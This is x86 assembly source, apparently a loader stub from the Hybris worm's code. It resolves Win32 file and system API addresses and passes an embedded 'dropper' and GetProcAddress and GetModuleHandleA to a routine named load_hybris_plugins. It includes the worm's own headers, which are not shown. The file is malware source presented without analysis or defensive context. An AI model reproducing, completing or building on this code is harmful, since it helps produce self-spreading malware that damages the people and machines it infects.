.386
.model flat
locals

include header.inc

ofs equ offset
by equ byte ptr
wo equ word ptr
dwo equ dword ptr

.data
include hybris.i
include dropper.asi


_GetSystemDirectoryA dd ?
_FindFirstFileA dd ?
_FindNextFileA dd ?
_CreateFileA dd ?
_GetFileSize dd ?
_GlobalAlloc dd ?
_ReadFile dd ?
_CloseHandle dd ?

.code


extrn GetSystemDirectoryA:PROC
extrn FindFirstFileA:PROC
extrn FindNextFileA:PROC
extrn CreateFileA:PROC
extrn GetFileSize:PROC
extrn GlobalAlloc:PROC
extrn ReadFile:PROC
extrn CloseHandle:PROC
extrn ExitProcess:PROC
extrn GetTickCount:PROC
extrn GetModuleHandleA:PROC
extrn GetProcAddress:PROC

start:
       mov eax,ofs GetSystemDirectoryA
       mov [_GetSystemDirectoryA],eax
       mov eax,ofs FindFirstFileA
       mov [_FindFirstFileA],eax
       mov eax,ofs FindNextFileA
       mov [_FindNextFileA],eax
       mov eax,ofs CreateFileA
       mov [_CreateFileA],eax
       mov eax,ofs GetFileSize
       mov [_GetFileSize],eax
       mov eax,ofs GlobalAlloc
       mov [_GlobalAlloc],eax
       mov eax,ofs ReadFile
       mov [_ReadFile],eax
       mov eax,ofs CloseHandle
       mov [_CloseHandle],eax

       push dropper_size
       push ofs dropper
       push ofs GetProcAddress
       push ofs GetModuleHandleA
       call load_hybris_plugins

       push 0
       call ExitProcess

include hybris.inc

end    start
